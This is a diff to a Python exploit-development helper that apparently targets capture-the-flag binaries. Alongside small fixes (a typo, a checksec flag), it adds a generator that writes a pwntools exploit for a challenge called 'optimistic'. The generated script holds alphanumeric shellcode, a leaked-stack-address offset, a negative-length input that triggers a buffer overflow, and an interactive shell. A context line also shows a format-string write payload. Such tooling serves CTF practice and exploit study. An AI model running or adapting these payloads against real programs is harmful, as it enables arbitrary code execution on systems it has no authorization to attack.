@@ -33,10 +33,11 @@ from termcolor import colored
 # -------------------------------------------------------------------------------------
 
 def bulkAddress(variable):
+   bulked = variable
    if DATA[5][:1] == "u":
       DATA[5] = spacePadding("64", COL1)
       print("[+] Defualting to 64 bits...")
-   bulked = variable
+
    if DATA[5][:2] == "64":
       if (len(variable) == 8) and (variable[:2] != "0x"):
          bulked = "0x00000000" + variable
@@ -1340,7 +1341,7 @@ while True:
          print("[-] Filename not specified...")
       else:
          print(colored("[*] Examining filename " + localDir + "/" + DATA[0].rstrip(" ") + "...", colour3))
-         command("checksec " + localDir + "/" + DATA[0].rstrip(" ") + " 2> checksec.tmp")
+         command("checksec --file " + localDir + "/" + DATA[0].rstrip(" ") + " 2> checksec.tmp")
          cutLine("*", "checksec.tmp")
          parsFile("checksec.tmp")
          catsFile("checksec.tmp")         
@@ -1671,7 +1672,7 @@ while True:
       if DATA[0][:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         LEN1 = input("[?] Please input lenght of pattern: ")
+         LEN1 = input("[?] Please input length of pattern: ")
          if LEN1.isdigit():
             print(colored("[*] Creating unique pattern...", colour3))          
             command("msf-pattern_create -l " + LEN1 + " > pattern.tmp")
@@ -2156,7 +2157,20 @@ while True:
             command("echo 'info(\"leaked_addr = 0x%x (%d)\", leaked_addr, leaked_addr)' >> " + localDir + "/exploit.py")
             command("echo 'random_num_addr = leaked_addr - 0x11f' >> " + localDir + "/exploit.py")
             command("echo 'payload = flat([\"%12$lln\", \"%13$llnaa\", pack(0x404078), pack(random_num_addr)])' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER              
+         if DATA[0][:10] == "optimistic":
+            command("echo 's.sendlineafter(\":\", \"y\")' >> " + localDir + "/exploit.py")
+            command("echo 'rbp_addr = int(re.search(r\"(0x[\w\d]+)\", s.recvlineS()).group(0), 16)' >> " + localDir + "/exploit.py")
+            command("echo 'rbp_addr -= 96 # point at RSP instead of RBP' >> " + localDir + "/exploit.py")
+            command("echo 'shellcode = \"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V\"' >> " + localDir + "/exploit.py")
+            command("echo 'payload = flat([shellcode, cyclic(offset - len(shellcode)), rbp_addr])' >> " + localDir + "/exploit.py")
             command("echo '' >> " + localDir + "/exploit.py") # SPACER  
+            command("echo 's.sendlineafter(\"Email:\", \"420\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\"Age:\", \"1337\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\"Length of name:\", \"-1\")' >> " + localDir + "/exploit.py")
+            command("echo 's.sendlineafter(\"Name:\", payload)' >> " + localDir + "/exploit.py")
+            command("echo 's.interactive()'  >> " + localDir + "/exploit.py")
+            command("echo 'exit()'  >> " + localDir + "/exploit.py")
             
 # ADD YOUR BESPOKE PAYLOADS HERE
          
